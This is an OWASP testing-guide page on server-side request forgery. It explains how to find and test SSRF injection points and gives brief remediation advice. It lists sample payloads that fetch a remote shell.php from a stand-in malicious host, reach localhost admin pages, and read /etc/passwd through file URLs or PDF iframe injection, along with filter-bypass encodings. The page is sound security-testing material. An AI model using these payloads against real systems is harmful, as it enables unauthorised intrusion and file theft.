# WSTG - Latest
[Home](https://owasp.org/www-project-web-security-testing-guide/) > [Latest](https://owasp.org/www-project-web-security-testing-guide/latest/) > [4-Web Application Security Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/) > [07-Input Validation Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)
# Testing for Server-Side Request Forgery
ID  
---  
WSTG-INPV-19  
## Summary
Web applications often interact with internal or external resources. While you may expect that only the intended resource will be handling the data you send, improperly handled data may create a situation where injection attacks are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE).
## Test Objectives
  * Identify SSRF injection points.
  * Test if the injection points are exploitable.
  * Asses the severity of the vulnerability.


## How to Test
When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.
Consider the following request:
```
GET https://example.com/page?page=about.php

```

You can test this request with the following payloads.
### Load the Contents of a File
```
GET https://example.com/page?page=https://malicioussite.com/shell.php

```

### Access a Restricted Page
```
GET https://example.com/page?page=http://localhost/admin

```

Or:
```
GET https://example.com/page?page=http://127.0.0.1/admin

```

Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the `admin` page.
These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.
### Fetch a Local File
```
GET https://example.com/page?page=file:///etc/passwd

```

### HTTP Methods Used
All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.
One important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.
You can find more on Blind SSRF [here](https://portswigger.net/web-security/ssrf/blind), or in the [references section](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery#references).
### PDF Generators
In some cases, a server may convert uploaded files to PDF format. Try injecting `<iframe>`, `<img>`, `<base>`, or `<script>` elements, or CSS `url()` functions pointing to internal services.
```
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">

```

### Common Filter Bypass
Some applications block references to `localhost` and `127.0.0.1`. This can be circumvented by:
  * Using alternative IP representation that evaluate to `127.0.0.1`: 
    * Decimal notation: `2130706433`
    * Octal notation: `017700000001`
    * IP shortening: `127.1`
  * String obfuscation
  * Registering your own domain that resolves to `127.0.0.1`


Sometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented, resulting in attacks similar to [semantic attacks](https://tools.ietf.org/html/rfc3986#section-7.6).
  * Using the `@` character to separate between the userinfo and the host: `https://expected-domain@attacker-domain`
  * URL fragmentation with the `#` character: `https://attacker-domain#expected-domain`
  * URL encoding
  * Fuzzing
  * Combinations of all of the above


For additional payloads and bypass techniques, see the [references](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery#references) section.
## Remediation
SSRF is known to be one of the hardest attacks to defeat without the use of allow lists that require specific IPs and URLs to be allowed. For more on SSRF prevention, read the [Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
## Spotlight: United Airlines
[![image](https://owasp.org/assets/images/corp-member-logo/ua_logo_stack_rgb_r.png)](https://www.united.com/)
At United, Good Leads The Way. With U.S. hubs in Chicago, Denver, Houston, Los Angeles, Newark/New York, San Francisco, and Washington, D.C., United operates the most comprehensive global route network among North American carriers, and is now the largest airline in the world as measured by available seat miles. United focuses on ensuring technology, systems, and processes are robust against cyber threats to protect our customers, employees, and operations.
## Corporate Supporters
[![image](https://owasp.org/assets/images/corp-member-logo/InfoSecMap-logo-small.png)](https://infosecmap.com)[![image](https://owasp.org/assets/images/corp-member-logo/Checkmarxn-NewLogo2024.jpg)](http://checkmarx.com)[![image](https://owasp.org/assets/images/corp-member-logo/invicti_logo_300x90_black.png)](https://www.invicti.com/)[![image](https://owasp.org/assets/images/corp-member-logo/fortify__logo__normal2x_1.png)](https://www.microfocus.com/en-us/cyberres/application-security)[![image](https://owasp.org/assets/images/corp-member-logo/GuardSquare.png)](https://www.guardsquare.com/)[![image](https://owasp.org/assets/images/corp-member-logo/Automattic.png)](https://automattic.com/)[![image](https://owasp.org/assets/images/corp-member-logo/Digital.png)](http://digital.ai)[![image](https://owasp.org/assets/images/corp-member-logo/bionic_logo_1.png)](https://www.bionic.ai/)[![image](https://owasp.org/assets/images/corp-member-logo/tenable_logo.png)](https://www.tenable.com)
[Become a corporate supporter](https://owasp.org/supporters)
[](https://github.com/OWASP/) [](https://owasp.org/slack/invite) [](https://www.facebook.com/OWASPFoundation) [](https://infosec.exchange/@owasp) [](https://twitter.com/owasp) [](https://www.linkedin.com/company/owasp/) [](https://www.youtube.com/user/OWASPGLOBAL)
  * [HOME](https://owasp.org/)
  * [PROJECTS](https://owasp.org/projects/)
  * [CHAPTERS](https://owasp.org/chapters/)
  * [EVENTS](https://owasp.org/events/)
  * [ABOUT](https://owasp.org/about/)
  * [PRIVACY](https://owasp.org/www-policy/operational/privacy)
  * [SITEMAP](https://owasp.org/sitemap/)
  * [CONTACT](https://owasp.org/contact/)


OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, OWASP Boston Application Security Conference, and LASCON are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our [General Disclaimer](https://owasp.org/www-policy/operational/general-disclaimer.html). OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2025, OWASP Foundation, Inc. 
